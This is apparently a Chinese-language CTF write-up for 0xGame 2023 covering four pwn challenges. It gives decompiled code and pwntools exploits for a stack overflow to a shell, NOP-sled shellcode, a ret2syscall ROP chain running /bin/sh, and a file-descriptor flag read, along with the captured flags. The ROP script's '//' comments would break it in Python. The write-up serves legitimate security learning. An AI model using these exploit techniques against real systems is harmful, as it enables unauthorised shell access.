---
title: 0xGame 2023 Writeup
date: 2023-10-30T19:38:23+08:00
categories: [CTF]
tags: [CTF]
---

## Pwn

### [Week1] 找不到且不对劲的flag

> 这个黑不溜秋的框框是啥？
>
> 这是flag吗？
>
> 我flag呢？

根据题目描述，猜测 flag 被藏到了隐藏文件或者隐藏文件夹中。

```bash
$ nc 8.130.35.16 51000
$ ls -a
.
..
.bash_logout
.bashrc
.profile
.secret
bin
flag
lib
lib32
lib64
libexec
libx32
netcat
$ ls .secret
flag
$ cat .secret/flag
0xGame{N3t_cA7_M30w_9dn23hcx8}

```

### [Week 1] 永远进不去的后门

> 后门就在那里，但你就是进不去
>
> 气不气气不气

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+0h] [rbp-40h] BYREF
  int v5; // [rsp+8h] [rbp-38h]

  bufinit(argc, argv, envp);
  puts("Welcome to 0xGame2023!");
  puts("Tell me sth interesting, and I will give you what you want.");
  read(0, buf, 0x100uLL);
  if ( v5 % 2023 == 2023 )
    system("/bin/sh");
  else
    puts("Not that interesting. Bye.");
  return 0;
}
```

read 存在溢出漏洞，直接覆盖掉 ret 地址即可得到 shell。

```python
from pwn import *

conn = remote("8.130.35.16", 51002)
conn.recvuntil("want.\n")
conn.sendline(b"a" * 0x48 + p64(0x401298))
conn.interactive()

# 0xGame{W3lC0me_4b0rd_PWN_L4nd!_k20cu2c7}
```

### [Week 1] 随便乱搞的shellcode

> shell壳code码，这怎么就乱搞了？

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char *buf; // [rsp+8h] [rbp-8h]
  void (*bufa)(void); // [rsp+8h] [rbp-8h]

  bufinit(argc, argv, envp);
  buf = (char *)mmap((void *)0x20230000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Now show me your code:");
  read(0, buf, 0x100uLL);
  puts("Implementing security mechanism...");
  v3 = time(0LL);
  srand(v3);
  bufa = (void (*)(void))&buf[rand() % 256];
  close(1);
  puts("Done!");
  bufa();
  return 0;
}
```

程序会随机执行 buf 中的一条命令，可以把 buf 的前面都填充 `nop` 指令，将 shellcode 放在 buf 的末尾来增加成功执行的概率。

`nop`：空指令（0x90），占用一个指令的时间，但什么都不做，并继续执行接下来的指令。

`str.rjust(width[, fillchar])`：将字符串右对齐到 width 长度，并在左侧填充 fillchar。

因为程序将标准输出流关闭了，所以得到 shell 以后可以执行 `exec 1>&2` 来将默认标准输出流重定向到标准错误流输出。

```python
from pwn import *

context(os="linux", arch="amd64")

conn = remote("8.130.35.16", 51003)
conn.recvuntil("code:\n")
conn.sendline(asm(shellcraft.sh()).rjust(0x100, b"\x90"))
conn.interactive()

# 0xGame{Try_to_Wr1t3_by_yourse1f!_an9d02cy}
```

### [Week1] 高端的syscall

> 系统调用是个好东西

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  bufinit(argc, argv, envp);
  puts("I leave something interesting in this program.");
  puts("Now try to find them out!");
  puts("Input: ");
  gets(v4);
  return 0;
}
```

程序开启了 NX 保护并且没有后门函数，可以自己手动构造 syscall 来得到 shell。

注意到程序还提供了几个辅助函数用来构造 syscall：

**set_rax**

```assembly
.text:0000000000401196                 endbr64
.text:000000000040119A                 push    rbp
.text:000000000040119B                 mov     rbp, rsp
.text:000000000040119E                 mov     [rbp-4], edi
.text:00000000004011A1                 mov     eax, [rbp-4]
.text:00000000004011A4                 pop     rbp
.text:00000000004011A5                 retn
```

**gadget**

```assembly
.text:00000000004011AE                 syscall                 ; LINUX -
```

几个知识点：

- `syscall` 会根据 `rax` 中存储的系统调用号来执行对应的系统调用函数。
- `__lib_csu_init` 中有两个方便的 gadgets 可以供我们使用。
- 过程中需要的字段可以通过 gets 存储到 .bss 段中使用。

```python
from pwn import *

context(arch="amd64", os="linux")

# s = gdb.debug("./ret2syscall", "break main")
s = process("./ret2syscall")
elf = ELF("./ret2syscall")

setrax = 0x401196
syscall = 0x4011AA
csu1 = 0x4012DA
csu2 = 0x4012C0
rdi = 0x4012E3

bss = 0x404500
execve = 0x3B

payload = flat([
    b"a" * 0x18,          // 覆盖到 retn 地址
    rdi, bss,             // 将 rdi 设置为 bss 起始地址
    elf.plt.gets,         // 执行 gets，将自定义数据写入 rdi 指向的值
    rdi, execve,          // 将 rdi 设置为 execve 的系统调用号
    setrax,               // 将 rax 的值设置为 rdi 指向的值

    csu1, 0, 0,  bss, 0, 0, bss+8,
    csu2
])

s.recvuntil("Input: ")
s.sendline(payload)
s.sendline(b"/bin/sh\0"+p64(syscall))
s.interactive()

```

### [Week3] all-in-files

> 一切皆文件是一种哲学

首先打开ida分析题目给的二进制文件。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  char v5[4]; // [rsp+8h] [rbp-8h] BYREF
  int fd; // [rsp+Ch] [rbp-4h]

  bufinit(argc, argv, envp);
  printf("Input filename to open: ");
  filename[(int)read(0, filename, 0x1FuLL)] = 0;
  printf("Input file id to read from: ");
  __isoc99_scanf("%d", v5);
  printf("Input file id to write to: ");
  __isoc99_scanf("%d", &v4);
  close(1);
  fd = open(filename, 0);
  if ( fd != -1 )
  {
    read(fd, &filebuf, 0x1FFuLL);
    write(v4, &filebuf, 0x1FFuLL);
    exit(0);
  }
  puts("Failed to open file!");
  return 0;
}
```

大致思路是读取 `/flag` 中的内容，然后输出到屏幕。注意到标准输出流（fd=1）被关闭了，可以用标准错误流（fd=2）代替。

```bash
Input filename to open: /flag
Input file id to read from: 3
Input file id to write to: 2

```

发现程序并没有返回任何内容。打开gdb进行调试，发现在读入 `filename` 的时候，读取的是 `/flag\n`，最终`fd`的值为 `-1`，推测是因为末尾的`\n`导致无法读取成功，最后因为标准输出流被关闭了，所以不会输出 `Failed to open file!` 提示用户。

使用 `pwntools` 来输入 `/flag\0`，保证不会因为 `\n` 的原因而无法读取文件：

```python
from pwn import *

conn = remote("8.130.35.16", 53000)

conn.recvuntil(b"Input filename to open: ")
conn.sendline(b"/flag\0")
conn.recvuntil(b"Input file id to read from: ")
conn.sendline(b"3")
conn.recvuntil(b"Input file id to write to: ")
conn.sendline(b"2")
print(conn.recvline())

# 0xGame{A11_1s_files_H3R3_1n9d2h9c}
```

